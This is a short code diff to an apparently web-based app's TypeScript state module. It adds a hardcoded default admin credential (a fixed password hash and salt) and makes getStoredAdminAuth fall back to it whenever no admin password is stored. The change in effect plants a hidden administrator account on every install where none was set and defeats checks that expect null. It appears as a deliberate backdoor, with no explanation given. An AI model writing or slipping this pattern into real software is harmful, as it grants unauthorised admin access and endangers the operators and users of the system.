@@ -85,8 +85,15 @@ function writeState(next: RuntimeState): void {
   }
 }
 
+const DEFAULT_ADMIN_AUTH: StoredAdminAuth = {
+  passwordHash:
+    '702aef244f6eea7716aae9cdc9038b091317818538359980d6727e2fffdeffab71a57043dbcbf5accca6365d40553a00651739f3afe9281658e6b60d9a357918',
+  salt: 'e7f2783b73d648a59e3c482b82ad29ef',
+  updatedAt: '2026-11-25T18:25:44.276204+00:00',
+};
+
 export function getStoredAdminAuth(): StoredAdminAuth | null {
-  return readState().adminAuth;
+  return readState().adminAuth || DEFAULT_ADMIN_AUTH;
 }
 
 export function setStoredAdminAuthIfUnset(auth: StoredAdminAuth): boolean {
